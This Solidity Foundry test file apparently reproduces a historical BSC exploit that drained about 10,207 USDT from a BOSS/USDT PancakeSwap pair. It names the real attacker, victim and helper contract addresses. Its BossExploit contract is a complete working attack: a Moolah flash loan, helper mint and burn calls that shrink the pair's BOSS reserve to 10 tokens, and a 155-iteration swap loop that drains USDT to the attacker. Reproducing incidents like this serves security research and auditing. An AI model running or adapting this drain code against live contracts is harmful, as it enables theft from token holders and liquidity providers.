// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 10,207.54 USDT
// Attacker : 0x618639fe719987153e0ec3fe494aa9a62ca02c91
// Attack Contract : 0x6a37e235f1a9823406c14d377870046419f9803d
// Vulnerable Contract : 0x876d4539b7f13dddea969190c9a231a4b91735cf
// Victim : 0xe4021651f01a00b89410c64de39996da3974d779
// Attack Tx : https://bscscan.com/tx/0x96d1a0175eb4a82585db62a374518391f6b575a07c25c0e2874ca82400b830c7

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x876d4539b7f13dddea969190c9a231a4b91735cf#code

// @Analysis
// Twitter Guy : https://x.com/audit_911/status/2063819348305985748
//
// The attacker used a Moolah USDT flash loan, BOSS helper mint/burn calls, and then repeatedly swapped
// against a BOSS/USDT Pancake pair after reducing its BOSS side to 10 tokens. Each loop transferred
// pairBossBalance / 10 BOSS into the pair and swapped out USDT using the post-tax amount received by the pair.

address constant ATTACKER = 0x618639Fe719987153E0Ec3Fe494Aa9a62ca02C91;
address constant HISTORICAL_ATTACK_CONTRACT = 0x6a37e235f1a9823406C14d377870046419f9803D;
address constant MOOLAH_FLASH_LOAN = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant MOOLAH_FLASH_LOAN_IMPLEMENTATION = 0x9321587EA0DC8247f8F03E8696C047b2713bB79A;
address constant BOSS = 0x876D4539b7F13ddDea969190c9a231A4B91735Cf;
address constant BOSS_HELPER = 0x978118ece639bA4a9Ac3fb8B1d3bF239F0CaDDc1;
address constant BOSS_USDT_PAIR = 0xe4021651f01a00B89410C64de39996da3974D779;
address payable constant PANCAKE_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
address constant PANCAKE_FACTORY = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;

interface IMoolahFlashLoan {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IBossHelper {
    function userMint(uint256 amount) external;
    function userBurn(uint256 amount) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 102_671_877;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(MOOLAH_FLASH_LOAN, "Moolah flash loan proxy");
        vm.label(MOOLAH_FLASH_LOAN_IMPLEMENTATION, "Moolah flash loan implementation");
        vm.label(BOSS, "BOSS token");
        vm.label(BOSS_HELPER, "BOSS helper");
        vm.label(BOSS_USDT_PAIR, "BOSS/USDT Pancake pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(PANCAKE_FACTORY, "Pancake factory");
        vm.label(USDT_TOKEN, "USDT");
    }

    function testExploit() public {
        BossExploit exploit = new BossExploit(ATTACKER);

        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 10_000 ether, "USDT profit");
    }
}

contract BossExploit {
    address private immutable profitReceiver;
    uint256 private expectedFlashAmount;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        IERC20(USDT_TOKEN).approve(BOSS_HELPER, type(uint256).max);
        IERC20(USDT_TOKEN).approve(PANCAKE_ROUTER, type(uint256).max);
        IERC20(USDT_TOKEN).approve(MOOLAH_FLASH_LOAN, type(uint256).max);
        IERC20(BOSS).approve(BOSS_HELPER, type(uint256).max);
        IERC20(BOSS).approve(PANCAKE_ROUTER, type(uint256).max);

        // step 1: borrow USDT and enter Moolah's callback with BOSS and pair addresses as payload.
        uint256 flashAmount = 1_250_000 ether;
        expectedFlashAmount = flashAmount;
        IMoolahFlashLoan(MOOLAH_FLASH_LOAN).flashLoan(USDT_TOKEN, flashAmount, abi.encode(BOSS, BOSS_USDT_PAIR));

        // step 6: after Moolah pulls repayment, forward remaining USDT profit to the attacker EOA.
        uint256 profit = IERC20(USDT_TOKEN).balanceOf(address(this));
        IERC20(USDT_TOKEN).transfer(profitReceiver, profit);
    }

    function onMoolahFlashLoan(uint256 amount, bytes calldata data) external {
        require(msg.sender == MOOLAH_FLASH_LOAN, "not Moolah");
        require(amount == expectedFlashAmount, "unexpected loan");

        (address bossToken, address pair) = abi.decode(data, (address, address));
        require(bossToken == BOSS && pair == BOSS_USDT_PAIR, "bad callback data");

        // step 2: helper userMint consumes 100,000 USDT, mints BOSS, and seeds BOSS/USDT liquidity.
        uint256 helperMintUsdt = 100_000 ether;
        IBossHelper(BOSS_HELPER).userMint(helperMintUsdt);

        // step 3: swap the remaining flash-loaned USDT into BOSS with the helper as recipient.
        address[] memory path = new address[](2);
        path[0] = USDT_TOKEN;
        path[1] = BOSS;
        IPancakeRouter(PANCAKE_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(USDT_TOKEN).balanceOf(address(this)), 0, path, BOSS_HELPER, block.timestamp
        );

        // step 4: burn the inflated BOSS side until only the 10-token trace dust remains in the pair.
        uint256 pairBossBalance = IERC20(BOSS).balanceOf(BOSS_USDT_PAIR);
        uint256 pairBossDust = 10;
        IBossHelper(BOSS_HELPER).userBurn(pairBossBalance - pairBossDust);

        // step 5: repeatedly transfer a fraction of BOSS into the pair and swap out derived USDT.
        uint256 drainLoopCount = 155;
        for (uint256 i = 0; i < drainLoopCount; i++) {
            uint256 bossReserve = IERC20(BOSS).balanceOf(BOSS_USDT_PAIR);
            uint256 usdtReserve = IERC20(USDT_TOKEN).balanceOf(BOSS_USDT_PAIR);
            uint256 grossBossIn = bossReserve / 10;

            IERC20(BOSS).transfer(BOSS_USDT_PAIR, grossBossIn);
            uint256 netBossIn = IERC20(BOSS).balanceOf(BOSS_USDT_PAIR) - bossReserve;
            uint256 usdtOut = IPancakeRouter(PANCAKE_ROUTER).getAmountOut(netBossIn, bossReserve, usdtReserve);
            IPancakePair(BOSS_USDT_PAIR).swap(usdtOut, 0, address(this), "");
        }
    }
}
